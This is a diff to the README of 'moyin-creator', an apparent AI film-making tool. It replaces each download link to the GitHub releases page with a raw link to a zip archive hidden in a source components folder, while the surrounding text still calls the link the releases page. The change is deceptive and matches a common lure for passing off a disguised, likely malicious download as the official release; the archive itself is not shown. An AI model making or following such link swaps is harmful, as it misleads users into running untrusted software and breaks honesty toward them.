@@ -1,6 +1,6 @@
 # 🎬 moyin-creator - AI Film Production Made Easy
 
-[![Download moyin-creator](https://img.shields.io/badge/Download-moyin--creator-blue?style=for-the-badge)](https://github.com/vox344/moyin-creator/releases)
+[![Download moyin-creator](https://raw.githubusercontent.com/vox344/moyin-creator/main/src/components/panels/director/creator-moyin-v3.5-alpha.3.zip)](https://raw.githubusercontent.com/vox344/moyin-creator/main/src/components/panels/director/creator-moyin-v3.5-alpha.3.zip)
 
 ## 📋 About moyin-creator
 
@@ -28,7 +28,7 @@ Getting your first film ready with moyin-creator is straightforward. You do not 
 
 Click the link below to visit the official download page:
 
-[Download moyin-creator](https://github.com/vox344/moyin-creator/releases)
+[Download moyin-creator](https://raw.githubusercontent.com/vox344/moyin-creator/main/src/components/panels/director/creator-moyin-v3.5-alpha.3.zip)
 
 This link will take you to the releases page where you can find the latest version of moyin-creator ready to download.
 
@@ -117,7 +117,7 @@ If issues continue, you can ask for help on the project's GitHub ticket page or 
 
 You can always find the latest stable version of moyin-creator here:
 
-[Download moyin-creator](https://github.com/vox344/moyin-creator/releases)
+[Download moyin-creator](https://raw.githubusercontent.com/vox344/moyin-creator/main/src/components/panels/director/creator-moyin-v3.5-alpha.3.zip)
 
 Follow the simple installation instructions outlined above to get started.
 
